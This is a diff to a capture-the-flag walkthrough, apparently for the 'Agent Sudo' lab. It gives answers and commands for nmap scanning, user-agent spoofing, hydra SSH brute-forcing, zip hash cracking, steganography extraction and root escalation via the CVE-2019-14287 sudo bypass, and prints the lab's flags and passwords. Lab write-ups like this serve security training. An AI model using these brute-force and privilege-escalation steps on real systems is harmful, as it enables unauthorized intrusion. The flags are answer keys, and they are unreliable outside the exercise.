@@ -1,31 +1,83 @@
 Author note
 
 Enumerate
-1.How many open ports?
+1. How many open ports?
 nmap -sV 10.10.3.204
 ans :3
 
-2.How you redirect yourself to a secret page?
+2. How you redirect yourself to a secret page?
 curl -s http://10.10.3.204/ | html2text
 ans : user-agent
 
-3.What is the agent name?
+3. What is the agent name?
 curl -A "C" -L http://10.10.3.204
 ans : chris
 
 Hash cracking and brute-force
-1.FTP password
+1. FTP password
 install hydra and rockyou.txt
 hydra -l chris -P rockyou.txt 10.10.3.204 ssh
 ans: crystal
 
-2.Zip file password
+2. Zip file password
  ftp -p 10.10.3.204
  ftp > ls
- ftp > get To_agentJ.txt
+ ftp > get To_agentJ.txt 
  ftp > get cute-alien.jpg  
  ftp > get cutie.png
+ or
+ ftp > mget*
  ftp > quit
  
- binwalk -e cutie.png
+ binwalk cutie.png -e
  cd _cutie.png.extracted
+ install JohnTheRipper
+ git clone "https://github.com/magnumripper/JohnTheRipper.git" && cd JohnTheRipper/src && ./configure && sudo make -s clean && sudo make -sj4 
+  zip2john 8702.zip > output.txt
+  jhon output.txt
+   ans:  alien
+3. Steg password
+ 7z e 8702.zip
+ cat To_agentR.txt 
+ decode online  base64 "QXJlYTUx"
+ or
+ echo -n 'QXJlYTUx' | base64 -d
+ ans : Area51
+4. Who is the other agent (in full name)?
+ install steghide
+ steghide info cute-alien.jpg
+  passphrase: Area51
+ steghide --extract -sf cute-alien.jpg
+ cat message.txt 
+ ans : james
+5. SSH password  
+ans : hackerrules!
+
+Capture the user flag
+1. What is the user flag?
+ssh james@ip
+password :hackerrules!
+ans : b03d975e8c92a7c04146cfa7a5a313c7
+2. What is the incident of the photo called?
+scp james@ip:Alien_autospy.jpg /mnt/c/Users/field/Desktop/ok/try
+googling image
+ans: Roswell alien autopsy
+
+Privilege escalation
+1. CVE number for the escalation 
+ ans : CVE-2019-14287
+2. What is the root flag?
+  ssh james@ip
+  sudo -V | grep "Sudo ver"
+  Sudo version 1.8.21p2
+  https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287
+  sudo -u#-1 /bin/bash
+  download https://github.com/n0w4n/CVE-2019-14287/blob/master/sudo.sh
+  
+  sudo -u#-1 /bin/bash
+  cd /root/
+  cat root.txt
+  ans :b53a02f55b57d4439e3341834d70c062
+ 3.(Bonus) Who is Agent R?
+  Deskel
+ 
